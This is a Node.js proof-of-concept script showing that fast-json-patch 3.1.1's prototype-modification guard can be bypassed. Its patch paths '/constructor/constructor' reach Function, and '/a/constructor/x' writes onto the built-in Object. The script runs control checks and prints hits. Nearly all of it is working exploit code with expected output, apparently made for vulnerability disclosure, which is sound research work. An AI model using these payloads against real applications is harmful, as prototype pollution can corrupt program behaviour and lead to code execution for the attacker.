'use strict';
/**
 * fast-json-patch 3.1.1 — banPrototypeModifications bypass
 *
 *   npm i fast-json-patch@3.1.1
 *   node poc.js
 *
 * Expected (Node 22): control PASS, guard PASS, read HIT, write HIT.
 * Safety: the write below only adds Object.x in this process; nothing is persisted.
 */
const jsonpatch = require('fast-json-patch');

const show = (id, v) => console.log(`[${id}]`, v);

// control 1: normal resolution
show('control', jsonpatch.getValueByPointer({ a: { b: 7 } }, '/a/b')); // 7

// control 2: guard fires on the enumerated pattern
try {
  jsonpatch.applyPatch({ a: {} }, [{ op: 'add', path: '/__proto__/x', value: 1 }]);
  show('guard', 'MISS - not blocked');
} catch (e) {
  show('guard', 'PASS - ' + e.message.slice(0, 60));
}

// A. read: reach Function
const F = jsonpatch.getValueByPointer({}, '/constructor/constructor');
show('read_bypass', typeof F === 'function' ? 'HIT - got Function' : 'MISS - ' + typeof F);

// B. write: mutate a built-in
jsonpatch.applyPatch({ a: {} }, [{ op: 'add', path: '/a/constructor/x', value: 'INJECTED' }]);
show('write_bypass', Object.x === 'INJECTED' ? 'HIT - Object.x=' + Object.x : 'MISS');

// NOTE: the library returns Function; it never calls it.
// Escalation to code execution requires the *caller* to invoke the returned value.
